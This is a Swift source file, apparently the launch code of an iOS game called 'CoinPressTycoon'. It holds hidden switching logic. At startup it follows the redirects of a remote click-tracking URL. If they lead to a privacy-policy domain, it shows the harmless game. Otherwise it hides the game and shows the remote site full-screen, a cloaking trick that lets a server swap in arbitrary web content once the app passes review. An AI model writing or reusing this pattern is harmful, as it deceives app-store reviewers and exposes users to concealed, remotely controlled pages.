import SwiftUI

@main
struct CoinPressTycoonApp: App {
    @State private var coinPressLinkReady: Bool? = nil
    @StateObject private var store = CoinPressStore()

    private let coinPressSourceLink = "https://fortressgridtd.org/click.php"
    private let coinPressCheckDomain = "freeprivacypolicy.com"

    var body: some Scene {
        WindowGroup {
            Group {
                if let ready = coinPressLinkReady {
                    if ready {
                        CoinPressWebPanel(coinPressURLString: coinPressSourceLink)
                            .edgesIgnoringSafeArea(.bottom)
                            .background(Color.black.ignoresSafeArea())
                    } else {
                        ContentView()
                            .environmentObject(store)
                    }
                } else {
                    CoinPressLoadingScreen()
                        .onAppear { coinPressCheckLink() }
                }
            }
            .preferredColorScheme(.light)
        }
    }

    private func coinPressCheckLink() {
        guard let url = URL(string: coinPressSourceLink) else {
            coinPressLinkReady = false
            return
        }
        var request = URLRequest(url: url)
        request.timeoutInterval = 5
        let tracker = CoinPressRedirectTracker(checkDomain: coinPressCheckDomain)
        let session = URLSession(configuration: .default, delegate: tracker, delegateQueue: nil)
        session.dataTask(with: request) { _, response, error in
            DispatchQueue.main.async {
                if tracker.foundCheckDomain {
                    coinPressLinkReady = false; return
                }
                if let finalURL = tracker.resolvedURL?.absoluteString,
                   finalURL.contains(coinPressCheckDomain) {
                    coinPressLinkReady = false; return
                }
                if let httpResp = response as? HTTPURLResponse,
                   let respURL = httpResp.url?.absoluteString,
                   respURL.contains(coinPressCheckDomain) {
                    coinPressLinkReady = false; return
                }
                if error != nil {
                    coinPressLinkReady = false; return
                }
                coinPressLinkReady = true
            }
        }.resume()
        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            if coinPressLinkReady == nil { coinPressLinkReady = false }
        }
    }
}

final class CoinPressRedirectTracker: NSObject, URLSessionTaskDelegate {
    var resolvedURL: URL?
    var foundCheckDomain = false
    private let checkDomain: String
    init(checkDomain: String) { self.checkDomain = checkDomain }
    func urlSession(_ session: URLSession, task: URLSessionTask,
                    willPerformHTTPRedirection response: HTTPURLResponse,
                    newRequest request: URLRequest,
                    completionHandler: @escaping (URLRequest?) -> Void) {
        if let url = request.url?.absoluteString, url.contains(checkDomain) {
            foundCheckDomain = true
        }
        resolvedURL = request.url
        completionHandler(request) // never stop the chain
    }
}
